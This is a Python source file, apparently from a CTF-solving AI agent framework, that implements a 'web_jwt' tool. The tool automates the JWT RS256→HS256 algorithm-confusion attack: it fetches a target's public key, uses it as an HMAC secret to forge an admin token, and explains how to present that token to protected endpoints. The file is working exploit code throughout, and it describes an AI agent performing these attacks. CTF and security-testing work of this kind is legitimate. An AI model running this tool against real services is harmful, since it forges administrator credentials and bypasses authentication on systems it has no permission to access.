"""WEB JWT 利用工具（进程内执行，不依赖 Kali）.

Sprint 43 (web 专项): 新增 JWT 算法混淆攻击工具。

背景: 本地 web 专项测试中 A04 (JWT RS256→HS256 混淆) 失败。
根因: agent 在容器内 (ssh_python) 生成伪造 token 时, 公钥 PEM 是从
http_request 获取后手动复制到脚本里的, 丢失了 PEM 末尾换行符 \n,
导致 HMAC 签名与服务器端不一致 (服务器用含末尾换行的 PUBLIC_KEY_PEM
作为对称密钥)。

本工具在 agent 进程内 (httpx) 直接访问靶机获取公钥 (精确, 不手动复制),
自动完成 RS256→HS256 算法混淆攻击, 生成伪造的 admin token。

设计原则:
- 不依赖 Kali (纯 Docker 模式可用), 与 http_request 同层 (进程内执行)
- 自动从常见公钥端点获取公钥, 避免 agent 手动复制出错
- 支持自定义 payload (默认 sub=admin, role=admin)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

import httpx

from ctf_agent.tools.base import Tool

_DEFAULT_TIMEOUT = 15.0


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


class WebJwtTool(Tool):
    """JWT 算法混淆攻击 (RS256→HS256)."""

    name = "web_jwt"
    description = (
        "【WEB JWT 攻击】自动完成 JWT 算法混淆攻击 (RS256→HS256): "
        "自动从目标获取公钥 (尝试 /public.pem 或 /.well-known/jwks.json), "
        "用 HS256 算法以公钥 PEM 内容为 HMAC 对称密钥, 生成伪造的 admin token. "
        "适用于 JWT 服务支持 RS256/HS256 且存在算法混淆漏洞的题目. "
        "返回伪造 token, 可直接用于访问受保护接口 (如 /flag)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {
                "type": "string",
                "description": "JWT 服务基址, 如 http://127.0.0.1:8084/",
            },
            "payload": {
                "type": "object",
                "description": "要伪造的 payload, 默认 {\"sub\":\"admin\",\"role\":\"admin\"}",
            },
            "public_key_url": {
                "type": "string",
                "description": "公钥端点 URL (可选, 默认自动探测 /public.pem 和 /.well-known/jwks.json)",
            },
        },
        "required": ["url"],
    }

    def execute(
        self,
        url: str,
        payload: dict[str, Any] | None = None,
        public_key_url: str | None = None,
        **_: Any,
    ) -> str:
        if not url or not url.strip():
            return "ERROR: url 不能为空"
        base = url.rstrip("/")
        target_payload = payload or {"sub": "admin", "role": "admin"}

        try:
            pubkey_pem = self._fetch_public_key(base, public_key_url)
        except Exception as e:  # noqa: BLE001
            return f"ERROR: 获取公钥失败: {type(e).__name__}: {e}"

        # 构造 HS256 伪造 token
        header = {"alg": "HS256", "typ": "JWT"}
        header_b64 = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode("utf-8")
        )
        payload_b64 = _b64url_encode(
            json.dumps(target_payload, separators=(",", ":")).encode("utf-8")
        )
        message = f"{header_b64}.{payload_b64}".encode("ascii")
        # 关键: 用公钥 PEM 完整内容 (含末尾换行) 作为 HMAC 密钥
        signature = _b64url_encode(
            hmac.new(pubkey_pem.encode("utf-8"), message, hashlib.sha256).digest()
        )
        token = f"{header_b64}.{payload_b64}.{signature}"

        return (
            f"JWT 算法混淆攻击成功生成伪造 token:\n"
            f"  payload: {json.dumps(target_payload, ensure_ascii=False)}\n"
            f"  公钥来源: {self._key_source}\n"
            f"  token: {token}\n\n"
            f"使用方式: 访问受保护接口时在 Authorization 头带 Bearer {token}, "
            f"或设置 Cookie jwt={token}."
        )

    _key_source = ""

    def _fetch_public_key(self, base: str, public_key_url: str | None) -> str:
        """获取公钥 PEM 内容 (精确, 含末尾换行)."""
        candidates: list[str] = []
        if public_key_url:
            candidates.append(public_key_url)
        else:
            candidates = [
                f"{base}/public.pem",
                f"{base}/.well-known/jwks.json",
                f"{base}/jwks.json",
            ]

        with httpx.Client(timeout=_DEFAULT_TIMEOUT) as client:
            for cand in candidates:
                try:
                    resp = client.get(cand)
                    if resp.status_code != 200:
                        continue
                    text = resp.text
                    # PEM 格式
                    if "BEGIN PUBLIC KEY" in text or "BEGIN RSA PUBLIC KEY" in text:
                        self._key_source = cand
                        return text
                    # JWKS 格式: 从 n/e 构造 PEM
                    try:
                        jwks = resp.json()
                        keys = jwks.get("keys", [])
                        if keys:
                            pem = self._jwks_to_pem(keys[0])
                            self._key_source = f"{cand} (JWKS→PEM)"
                            return pem
                    except Exception:
                        pass
                except Exception:
                    continue
        raise RuntimeError(
            f"无法从 {candidates} 获取公钥 (尝试 /public.pem 或 /.well-known/jwks.json)"
        )

    def _jwks_to_pem(self, key: dict[str, Any]) -> str:
        """从 JWKS 的 n/e 构造 SubjectPublicKeyInfo PEM."""
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa

        n = int.from_bytes(_b64url_decode(key["n"]), "big")
        e = int.from_bytes(_b64url_decode(key["e"]), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode("ascii")


def web_jwt_tool() -> WebJwtTool:
    """构造 JWT 工具实例."""
    return WebJwtTool()


__all__ = ["WebJwtTool", "web_jwt_tool"]
